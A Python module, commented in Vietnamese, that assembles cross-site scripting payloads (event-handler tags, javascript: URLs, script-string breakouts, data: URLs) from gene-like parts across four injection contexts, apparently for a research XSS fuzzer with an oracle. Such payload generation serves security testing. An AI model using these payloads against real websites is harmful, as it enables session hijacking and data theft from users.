"""Rap 4 gen (escape, trigger, action, target_tag) thanh payload HTML/JS/URL.

Giu nguyen chu ky build_payload(context, escape, trigger, action, target_tag)
va cung cap helper cho Ma tran 6.2 (mechanism, event).
"""

from __future__ import annotations

_VOID_TAGS = frozenset({"img", "input", "br", "hr", "meta", "link", "source", "track", "wbr"})
_ERROR_SOURCE_TAGS = frozenset({"img", "video", "audio", "iframe", "script"})
_MEDIA_TAGS = frozenset({"video", "audio"})
_FOCUSABLE_NATIVE_TAGS = frozenset({"input", "button", "a"})


def mechanism_for_individual(context: str, trigger: str) -> str:
    """Tra ve nhan co che theo Ma tran 6.2: html_event | js_protocol | js_direct."""
    del context  # Giu tham so de dong bo chu ky voi event_for_individual.
    if trigger == "javascript:":
        return "js_protocol"
    if trigger == "direct":
        return "js_direct"
    if trigger.startswith("on"):
        return "html_event"
    raise ValueError(f"Khong xac dinh duoc mechanism cho trigger={trigger!r}")


def event_for_individual(context: str, trigger: str) -> str:
    """Tra ve ten event cho Oracle ('none' doi voi direct va javascript:)."""
    del context
    if trigger in ("direct", "javascript:"):
        return "none"
    return trigger


def _build_event_tag(target_tag: str, trigger: str, action: str) -> str:
    """Sinh the HTML co inline event handler, boc gia tri bang nhay kep."""
    if target_tag == "svg" and trigger == "onbegin":
        return f'<svg><animate onbegin="{action}" attributeName="x" dur="1s"></svg>'

    if trigger == "onerror" and target_tag in _ERROR_SOURCE_TAGS:
        source = ' src="/__oracle_missing_resource__"'
    elif trigger == "onload" and target_tag == "img":
        source = ' src="/validimage.gif"'
    elif trigger == "onloadstart" and target_tag in _MEDIA_TAGS:
        source = ' src="/validaudio.wav"'
    elif target_tag == "img":
        source = ' src="/validimage.gif"'
    else:
        source = ""

    open_attr = " open" if target_tag == "details" and trigger == "ontoggle" else ""
    focus_attr = (
        ' tabindex="0"'
        if trigger in {"onfocus", "onfocusin", "onkeyup"} and target_tag not in _FOCUSABLE_NATIVE_TAGS
        else ""
    )

    attrs = f'{source}{open_attr}{focus_attr} {trigger}="{action}"'
    if target_tag in _VOID_TAGS:
        return f"<{target_tag}{attrs}>"
    inner = "click" if target_tag in {"a", "button", "details"} else ""
    return f"<{target_tag}{attrs}>{inner}</{target_tag}>"


def _build_html_body(escape: str, trigger: str, action: str, target_tag: str) -> str:
    if trigger == "direct":
        body = (
            f"<script>{action}</script>"
            if target_tag == "script"
            else f"<{target_tag}><script>{action}</script></{target_tag}>"
        )
        return f"{escape}{body}"

    if trigger == "javascript:":
        if target_tag == "a":
            body = f'<a href="javascript:{action}">click</a>'
        elif target_tag == "iframe":
            body = f'<iframe src="javascript:{action}"></iframe>'
        elif target_tag == "svg":
            body = f'<svg><a xlink:href="javascript:{action}"><text y="20">click</text></a></svg>'
        elif target_tag == "object":
            body = f'<object data="javascript:{action}"></object>'
        elif target_tag in _VOID_TAGS:
            body = f'<{target_tag} src="javascript:{action}">'
        else:
            body = f'<{target_tag} src="javascript:{action}"></{target_tag}>'
        return f"{escape}{body}"

    return f"{escape}{_build_event_tag(target_tag, trigger, action)}"


def _build_attribute(escape: str, trigger: str, action: str, target_tag: str) -> str:
    if escape.endswith((" ", "\t")):
        return f'{escape}{trigger}="{action}"'
    prefix = escape if escape.endswith(">") else f"{escape}>"
    return f"{prefix}{_build_event_tag(target_tag, trigger, action)}"


def _build_js_string(escape: str, trigger: str, action: str, target_tag: str) -> str:
    if trigger == "direct":
        if escape == "${":
            return f"${{{action}}}"
        return f"{escape}{action}//"
    return f"{escape}</script>{_build_event_tag(target_tag, trigger, action)}"


def _build_url(trigger: str, action: str, target_tag: str) -> str:
    if target_tag == "a":
        return f"{trigger}{action}"
    return f"data:text/html,<script>{action}</script>"


def build_payload(context: str, escape: str, trigger: str, action: str, target_tag: str) -> str:
    if context == "html_body":
        return _build_html_body(escape, trigger, action, target_tag)
    if context == "attribute":
        return _build_attribute(escape, trigger, action, target_tag)
    if context == "js_string":
        return _build_js_string(escape, trigger, action, target_tag)
    if context == "url":
        return _build_url(trigger, action, target_tag)
    raise ValueError(f"Khong ho tro ngu canh: {context}")
